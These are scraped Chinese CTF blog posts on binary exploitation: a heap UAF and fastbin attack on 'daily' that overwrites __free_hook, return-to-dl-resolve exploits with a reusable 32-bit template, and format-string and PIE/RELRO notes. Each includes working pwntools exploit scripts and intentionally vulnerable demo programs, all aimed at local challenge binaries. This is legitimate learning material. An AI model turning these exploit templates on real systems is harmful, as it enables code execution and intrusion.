<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( qword_4040D8 &amp;&amp; !strcmp(*(const char **)(qword_4040D8 + 8), &amp;s2) )</span><br><span class="line">&#123;</span><br><span class="line">  *ptr = *(_DWORD *)v3 + 1;</span><br><span class="line">  ptr[1] = *(_DWORD *)(v3 + 4);</span><br><span class="line">  *((_QWORD *)ptr + 1) = *(_QWORD *)(v3 + 8);</span><br><span class="line">  *((_QWORD *)ptr + 2) = 0LL;</span><br><span class="line">  *(_QWORD *)(v3 + 16) = ptr;</span><br><span class="line">  qword_4040D8 = (__int64)ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到如果写的内容一样的话就直接把它 copy 过来,这样我们的思路就是不断利用 uaf 构造一个恶意的输入,所以步骤</p>
<ul>
<li>首先搞出来一个 unsort bin 泄漏 libc 地址</li>
<li>之后找一个堆来写伪造的 head</li>
<li>在这个伪造堆中填入 free</li>
<li>修改为 system 即可</li>
</ul>
<p>研究这个 wp 发现,这绝对是大佬的手笔啊,这么精简,简直太强了,膜一下 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8671b34f5620">Fish_o0O</a></p>
<h2 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h2><blockquote>
<p>任意位置 free</p>
</blockquote>
<p>我一开始找不到漏洞,在师傅们的 wp 下找到了点,我找漏洞实在是太不敏感,只能发现单字节溢出, UAF 这种洞,还得练呀</p>
<p>这题看师傅的思路很明白了,首先 malloc 几个然后让 unsortedbin 连起来,这样一个堆就能泄漏一个 heap 一个 libc ,学到了</p>
<p>之后利用任意地址 free ,把 fastbin 搞到 bss 端,之后把指针的指向改成常规的 free_hook 和 malloc_hook ,然后写入 system 就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./daily&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.recvuntil(&#x27;choice:&#x27;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    raw = p.recvuntil(&#x27;===&#x27;)[:-4]</span><br><span class="line">    return raw</span><br><span class="line"></span><br><span class="line">def add(length , content):</span><br><span class="line">    p.recvuntil(&#x27;choice:&#x27;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;daily:&#x27;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&#x27;daily\n&#x27;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def change(index , content):</span><br><span class="line">    p.recvuntil(&#x27;choice:&#x27;)</span><br><span class="line">    p.sendline(&#x27;3&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;daily:&#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&#x27;daily\n&#x27;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">    p.recvuntil(&#x27;choice:&#x27;)</span><br><span class="line">    p.sendline(&#x27;4&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;daily:&#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">#step1 leak libc&amp;heap base</span><br><span class="line">for i in range(5):</span><br><span class="line">    add(0x80 , &#x27;\x00&#x27; * 0x5f)</span><br><span class="line"></span><br><span class="line">remove(1)</span><br><span class="line">remove(3)</span><br><span class="line">add(0x80 , &#x27;&#x27;)</span><br><span class="line">libc.address = u64(show().split(&#x27;1 : &#x27;)[1][:6].ljust(8 , &#x27;\x00&#x27;)) - 0x3c4b0a</span><br><span class="line">change(1 , &#x27;abcdefgh&#x27;)</span><br><span class="line">heap_base = u64(show().split(&#x27;abcdefgh&#x27;)[1].split(&#x27;2 :&#x27;)[0].ljust(8 , &#x27;\x00&#x27;)) - 0x10a</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">success(&#x27;libc_base =&gt; &#x27; + hex(libc.address))</span><br><span class="line">success(&#x27;heap_base =&gt; &#x27; + hex(heap_base))</span><br><span class="line">success(&#x27;free_hook =&gt; &#x27; + hex(free_hook))</span><br><span class="line">success(&#x27;system_addr =&gt; &#x27; + hex(system_addr))</span><br><span class="line">success(&#x27;heap_base =&gt; &#x27; + hex(heap_base))</span><br><span class="line">#step2 clear heap</span><br><span class="line">remove(4)</span><br><span class="line">remove(2)</span><br><span class="line">remove(1)</span><br><span class="line">remove(0)</span><br><span class="line"></span><br><span class="line">#step3 free2fastbin</span><br><span class="line">add(0x30 , &#x27;a&#x27; * 8 + p64(heap_base + 0x10)) #heap_base + 0x18</span><br><span class="line">#0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">offset = (heap_base - 0x602060) / 16 + 1</span><br><span class="line">remove(offset)</span><br><span class="line"></span><br><span class="line">#step4 fastbin attack : free_hook =&gt; system</span><br><span class="line">add(0x41 , &#x27;\x00&#x27; * 0x40)</span><br><span class="line">#1</span><br><span class="line"></span><br><span class="line">change(0 , p64(0x602068))</span><br><span class="line"></span><br><span class="line">add(0x30 , &#x27;/bin/sh\x00&#x27;)       #heap</span><br><span class="line">add(0x30 , p64(free_hook))      #bss</span><br><span class="line">change(1 , p64(system_addr))</span><br><span class="line">#Get Ghell &amp; Have Fun</span><br><span class="line">remove(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/09/04/2019-09-08-isc2019/" data-id="cuid01_8ycSpgzKdP3YZEVZA5" data-title="信息安全竞赛" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-08-26-re2dlresolve" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/08/26/2019-08-26-re2dlresolve/" class="article-date">
  <time class="dt-published" datetime="2019-08-25T16:00:00.000Z" itemprop="datePublished">2019-08-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/08/26/2019-08-26-re2dlresolve/">高阶rop之</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>感觉这个和rop没什么太大关系，主要是理解延迟绑定之类的东西，本篇主要参考<strong>五千年木</strong>(真的感谢)大佬的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/elvirangel/p/8994799.html">文章</a>,并对最后exp作出了相对简洁的修改,下面写一下今天的收获</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//gcc x86.c -fno-stack-protector -m32 -o x86</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char gift[0x200];</span><br><span class="line">void fun()&#123;</span><br><span class="line">    char buffer[0x20];</span><br><span class="line">    read(0,buffer,0x200);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    fun();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大佬已经写好了,我们研究一下利用思路,这个栈溢出很容易发现,这时候我们需要接触到一个比较高阶的知识点,即利用<code>_dl_runtime_resolve</code>,我们首先得学习<strong>延迟绑定</strong>(Lazy Binding),这个网上都有的讲,我们学习完后应该了解函数内部走过的步骤,下面我们根据exp来学习一下</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./x86&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">elf = ELF(&#x27;./x86&#x27;)</span><br><span class="line">gift = 0x0804A040#bss</span><br><span class="line"></span><br><span class="line">payload = 0x28*&#x27;a&#x27; + 4*&#x27;a&#x27;</span><br><span class="line">payload +=  p32(elf.plt[&#x27;read&#x27;]) + p32(0x0804840B)#fun_addr</span><br><span class="line">payload += p32(0) + p32(gift) + p32(17*4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += p32(0x0804a00c) + p32(0x1e807)</span><br><span class="line">payload += p32(0)+p32(0x1e44)</span><br><span class="line">payload += p32(0) *4</span><br><span class="line">payload += &#x27;system\x00\x00&#x27;</span><br><span class="line">payload += &#x27;/bin/bash\x00&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = 0x28*&#x27;a&#x27; + 4*&#x27;a&#x27;</span><br><span class="line">payload += p32(0x080482D0) + p32(0x1da8) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + &#x27;sh&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>我们简单看一下溢出过程,第一处<strong>payload</strong>,先 <strong>read(0,bss_addr,buf_size)</strong> 把我们的<strong>gift</strong>构造好,之后再跳转到<strong>fun()</strong>,又让我们输入即第三个<strong>payload</strong>,溢出时写的 <strong>0x80482d0</strong> (内容:push   DWORD PTR ds:0x804a004),我们之前的<code>push 0</code>被我们自己写的<code>0x1da8</code>替代了,所以函数大概是<code> _dl_runtime_resolve(ds:0x804a004,0x1da8)</code>,之后一个垃圾数据做填充后填入system的参数即可完成本次攻击,下面我们深入分析一下<strong>gift</strong></p>
<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>这是gift内部结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	0x0804a00c</span><br><span class="line">	0x1e807-------</span><br><span class="line">	0            |</span><br><span class="line">------- 0x1e44 &lt;------</span><br><span class="line">|	0</span><br><span class="line">|	0</span><br><span class="line">|	0</span><br><span class="line">|	0</span><br><span class="line">------&gt; syst</span><br><span class="line">	em</span><br><span class="line">	/bin/sh</span><br></pre></td></tr></table></figure>
<p>看到这个应该就了解了,我们的2处指向使其指向了system,我们来看一下各个部分都是怎么来的</p>
<ul>
<li><code>0x1da8</code>是偏移,即bss和<code>.rel.plt段</code>(根据<code>objdump -s -j .rel.plt ./x86</code>)位置差</li>
<li><code>0x1e807</code>根据<code>((欲伪造的地址-.dynsym基地址)/0x10)&lt;&lt;8+7</code>,其中<code>dynsym</code>根据<code>objdump -s -j .dynsym ./x86</code></li>
<li><code>0x1e44</code>是<code>伪造地址-.dynstr基地址(objdump -s -j .dynstr ./x86)</code></li>
</ul>
<p>最后在伪造地址填入<code>system</code>即完成操作,我们拿9102年国赛练习一下</p>
<h2 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:20:42] </span><br><span class="line">$ objdump -s -j .rel.plt ./pwn</span><br><span class="line"></span><br><span class="line">./pwn：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .rel.plt:</span><br><span class="line"> 804833c 0ca00408 07010000 10a00408 07020000  ................</span><br><span class="line"> 804834c 14a00408 07040000 18a00408 07050000  ................</span><br></pre></td></tr></table></figure>

<p>bss段地址为0x804A040,故第一处为0x1d04</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:20:46] </span><br><span class="line">$ objdump -s -j .dynsym ./pwn</span><br><span class="line"></span><br><span class="line">./pwn：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .dynsym:</span><br><span class="line"> 80481dc 00000000 00000000 00000000 00000000  ................</span><br><span class="line"> 80481ec 20000000 00000000 00000000 12000000   ...............</span><br><span class="line"> 80481fc 33000000 00000000 00000000 12000000  3...............</span><br><span class="line"> 804820c 53000000 00000000 00000000 20000000  S........... ...</span><br><span class="line"> 804821c 41000000 00000000 00000000 12000000  A...............</span><br><span class="line"> 804822c 39000000 00000000 00000000 12000000  9...............</span><br><span class="line"> 804823c 25000000 64a00408 04000000 11001a00  %...d...........</span><br><span class="line"> 804824c 2c000000 40a00408 04000000 11001a00  ,...@...........</span><br><span class="line"> 804825c 0b000000 fc850408 04000000 11001000  ................</span><br><span class="line"> 804826c 1a000000 60a00408 04000000 11001a00  ....`...........</span><br></pre></td></tr></table></figure>

<p>此处为  <code>((0x0804A040 + 4*4) - 0x80481dc) / 0x10 &lt;&lt; 8 + 7 即 0x1e707</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:21:26] C:1</span><br><span class="line">$ objdump -s -j .dynstr ./pwn</span><br><span class="line"></span><br><span class="line">./pwn：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .dynstr:</span><br><span class="line"> 804827c 006c6962 632e736f 2e36005f 494f5f73  .libc.so.6._IO_s</span><br><span class="line"> 804828c 7464696e 5f757365 64007374 64696e00  tdin_used.stdin.</span><br><span class="line"> 804829c 72656164 00737464 6f757400 73746465  read.stdout.stde</span><br><span class="line"> 80482ac 72720061 6c61726d 00736574 76627566  rr.alarm.setvbuf</span><br><span class="line"> 80482bc 005f5f6c 6962635f 73746172 745f6d61  .__libc_start_ma</span><br><span class="line"> 80482cc 696e005f 5f676d6f 6e5f7374 6172745f  in.__gmon_start_</span><br><span class="line"> 80482dc 5f00474c 4942435f 322e3000           _.GLIBC_2.0.    </span><br></pre></td></tr></table></figure>

<p>此处为<code>(0x0804A040 + 8 + 24) - 0x804827c = 0x1ee4</code></p>
<p>其中<code>0x8048380</code>是<code>push</code>完第一个参数后的地址,<code>0x0804a00c</code>是<code>read@got</code>,不过经本人测试,此数据在<code>0x0804a000~0x0804affc</code>区间都可完成操作,</p>
<p>我们来构造一下exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">gift = 0x0804A040#bss</span><br><span class="line"></span><br><span class="line">payload = 44*&#x27;a&#x27;</span><br><span class="line">payload +=  p32(elf.plt[&#x27;read&#x27;]) + p32(0x804852D)#fun_addr</span><br><span class="line">payload += p32(0) + p32(gift) + p32(17*4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += p32(0x0804a00c) + p32(0x1e707)</span><br><span class="line">payload += p32(0)+p32(0x1de4)</span><br><span class="line">payload += p32(0) *4</span><br><span class="line">payload += &#x27;system\x00\x00&#x27;</span><br><span class="line">payload += &#x27;/bin/bash\x00&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">payload =44*&#x27;a&#x27;</span><br><span class="line">payload += p32(0x8048380) + p32(0x1d04) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + &#x27;sh&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最后跑起来发现,完了,咋错了,然后又试了试,成功了.又,加上了sleep后就好了,以后这种连续send的一定加sleep呀~</p>
<p>本篇文章用来记录 rop 最难也是最晦涩的知识点</p>
<h1 id="Return-to-dl-resolve"><a href="#Return-to-dl-resolve" class="headerlink" title="Return-to-dl-resolve"></a>Return-to-dl-resolve</h1><h2 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h2><p>本方法仅需要一个 read 函数即可完成，同时 bss 端固定，可以在程序没有泄露函数时候大显身手</p>
<h2 id="writeup-（替换地址即可"><a href="#writeup-（替换地址即可" class="headerlink" title="writeup （替换地址即可"></a>writeup （替换地址即可</h2><blockquote>
<p>32 位通杀模板</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./x86&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">elf = ELF(&#x27;./x86&#x27;)</span><br><span class="line">gift = 0x0804A040#bss</span><br><span class="line"></span><br><span class="line">payload = 0x28*&#x27;a&#x27; + 4*&#x27;a&#x27;</span><br><span class="line">payload +=  p32(elf.plt[&#x27;read&#x27;]) + p32(0x0804840B)#fun_addr</span><br><span class="line">payload += p32(0) + p32(gift) + p32(17*4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += p32(0x0804a000) + p32(0x1e807)</span><br><span class="line">payload += p32(0)+p32(0x1e44)</span><br><span class="line">payload += p32(0) *4</span><br><span class="line">payload += &#x27;system\x00\x00&#x27;</span><br><span class="line">payload += &#x27;sh\x00&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = 0x28*&#x27;a&#x27; + 4*&#x27;a&#x27;</span><br><span class="line">payload += p32(0x080482D0) + p32(0x1da8) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + &#x27;sh&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"># 0x1da8 =&gt; $(objdump -s -j .rel.plt ./x86) - gift</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">	0x0804a000	=&gt; got</span><br><span class="line">	0x1e807-------  =&gt; [fake_addr - $(objdump -s -j .dynsym ./x86)]/0x10)&lt;&lt;8+7</span><br><span class="line">	0            |</span><br><span class="line">--- 0x1e44 &lt;------  =&gt; fake_addr - (objdump -s -j .dynstr ./x86)</span><br><span class="line">|	0</span><br><span class="line">|	0</span><br><span class="line">|	0</span><br><span class="line">|	0</span><br><span class="line">--&gt; syst</span><br><span class="line">	em\x00\x00</span><br><span class="line">	/bin/sh\x00</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/08/26/2019-08-26-re2dlresolve/" data-id="cuid_BQ-odCUV4-h701rdhm6H" data-title="高阶rop之" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-08-08-some_note" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/08/08/2019-08-08-some_note/" class="article-date">
  <time class="dt-published" datetime="2019-08-07T16:00:00.000Z" itemprop="datePublished">2019-08-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/08/08/2019-08-08-some_note/">一些笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Two-parameters-in-checksec"><a href="#Two-parameters-in-checksec" class="headerlink" title="Two parameters in checksec"></a>Two parameters in <code>checksec</code></h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://jin-yang.github.io/post/program-c-gcc-security-options.html">Some usages in gcc </a></p>
</blockquote>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><blockquote>
<p>combined with ASLR</p>
</blockquote>
<pre><code>#include &lt;stdio.h&gt;

void func();

int uninitialGlobalVar;
int globalVar = 1;

int main(void)
{
    int localVar = 1;

    printf(&quot;Address of func() is %p, in text setment\n&quot;, func);
    printf(&quot;Address of uninitialGlobalVar is %p, in bss segment\n&quot;, &amp;uninitialGlobalVar);
    printf(&quot;Address of globalVar is %p, in data segment\n&quot;, &amp;globalVar);
    printf(&quot;Address of localVar is %p, in stack\n&quot;, &amp;localVar);

    return 0;
}

void func()
{
    ;
}
</code></pre>
<p>You can find differences between <code>aslr</code> and <code>pie</code> from this <a target="_blank" rel="noopener" href="https://blog.csdn.net/Plus_RE/article/details/79199772">dalao’s blog </a>. We can use <code>-no-pie</code> this parameter to choose whether open pie or not in gcc . To put it simply , PIE only decide bss&#x2F;data&#x2F;code ‘s randomization .</p>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><blockquote>
<p>combined with format string vulnerability</p>
</blockquote>
<p>I write a demo like this :</p>
<pre><code>#include &lt;stdio.h&gt;
void show()
{
	system(&quot;/bin/sh&quot;);
}
int main() {
	char a[100];
	scanf(&quot;%s&quot;,a);
	printf(a);
	return(0);
}
//gcc -g -no-pie  -z norelro -m32 te.c
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.sendline(&#x27;%p.%p.%p.%p.%p.%p&#x27;)//test the offset</span><br><span class="line">&gt;&gt;&gt; p.recv()</span><br><span class="line">[*] Process &#x27;./a.out&#x27; stopped with exit code 0 (pid 431)</span><br><span class="line">&#x27;0xffa5a078.0xf7f36410.0x8048548.(nil).0x1.0x252e7025&#x27;</span><br><span class="line">//the offset is 6</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; p.sendline(&#x27;\x01\x80\x04\x08%x.%x.%x.%x.%x.%s&#x27;)</span><br><span class="line">&gt;&gt;&gt; p.recv()</span><br><span class="line">[*] Process &#x27;./a.out&#x27; stopped with exit code 0 (pid 433)</span><br><span class="line">&#x27;\x01\x80\x04\x08ffd1d438.f7f8c410.8048548.0.1.ELF\x01\x01\x01&#x27;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; p.sendline(&#x27;\x01\x80\x04\x08%6$s&#x27;)</span><br><span class="line">&gt;&gt;&gt; p.recv()</span><br><span class="line">[*] Process &#x27;./a.out&#x27; stopped with exit code 0 (pid 434)</span><br><span class="line">&#x27;\x01\x80\x04\x08ELF\x01\x01\x01&#x27;</span><br></pre></td></tr></table></figure>
<pre><code>//use %n to change the old bss value
bss_addr=0x0804a028//readelf -S a.out
bss = &#39;\x28\xa0\x04\x08%6$n&#39;//change to 4
bss = &#39;\x28\xa0\x04\x08%96c%6$n&#39;//change to 100
</code></pre>
<p>there is a code for format string vulnerability in pwntools : <code>payload = fmtstr_payload(6, {printf_got:system_plt})</code> . We can use <code>objdump -R $file_name</code> to find the specific function_got . However if you open RELRO , you will not be able to modify <code>printf_got</code> .</p>
<p>今天从零开始学<strong>stack</strong>,也算是记录一下吧,在这里记录一下特别细的知识点</p>
<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>使用<code>gcc -g -fno-stack-protector -z execstack -o test test.c</code>依次关掉<strong>Canary</strong>和<strong>NX</strong></p>
<p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭<strong>ASLR</strong></p>
<p><code> ulimit -c unlimited</code>表示自己程序只要错误就生成dump文件,之后<code>echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern</code>表示存到tmp目录下,之后我们就可以<code>gdb $文件名 core.%t</code>调试了</p>
